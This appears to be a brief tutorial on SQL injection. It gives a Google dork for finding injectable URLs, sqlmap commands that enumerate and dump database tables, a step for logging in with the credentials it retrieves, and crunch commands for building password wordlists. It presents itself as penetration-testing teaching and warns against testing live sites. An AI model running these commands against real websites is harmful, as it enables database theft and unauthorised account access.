What Is SQL Injection

Theory

SQL Injection (SQLi) is a cyberattack technique where a hacker inserts malicious SQL code into an input field (like a login form or search box) to manipulate or access a database illegally.

03

Website Database Hacking Using SQLmap Tool

Automated

What is SQL Map

  • SQL Map is a command-line tool
  • It is used to automate SQL injection testing
  • It helps in identifying databases, tables, columns, and data

SQL Map – Step-by-Step

01
Initial Preparation
Open Kali Linux. Do NOT test on live websites. Only test on your own website or practice websites.
02
Finding the Login Page
Open the website. Go to the sign-in / login page. Identify username and password fields. Copy the URL.
03
Identifying Source Links
Use Google dork: site:targetsite.com php?id= to find injectable parameters.
04
Open the Terminal
Aim is to find Database → Table → Columns → Data.
05
Using Retrieved Credentials
Go back to the admin or login page. Enter retrieved username and password. Login is successful.

SQLmap Commands

Terminal
Sqlmap -u websitelink --dbs
Sqlmap -u websitelink -D databasename --tables
Sqlmap -u websitelink -D databasename -T tablename --columns
Sqlmap -u websitelink -D databasename -T tablename -C columnname --dump

05

Create Dictionary Using Crunch Commands

Wordlist

What is Crunch

Crunch is a wordlist generation tool that comes pre-installed in Kali Linux. It's commonly used in penetration testing to create custom password lists for tools like aircrack-ng, hydra, john, etc.

Usage or syntax

Syntax
crunch <min> <max>

Examples

Crunch Examples
crunch 3 8 liger -o /root/Desktop/liger.txt
crunch 5 8 liger@$ -o /root/Desktop/liger.txt

where -o : output  |  /root/Desktop/liger.txt : where the output is saved
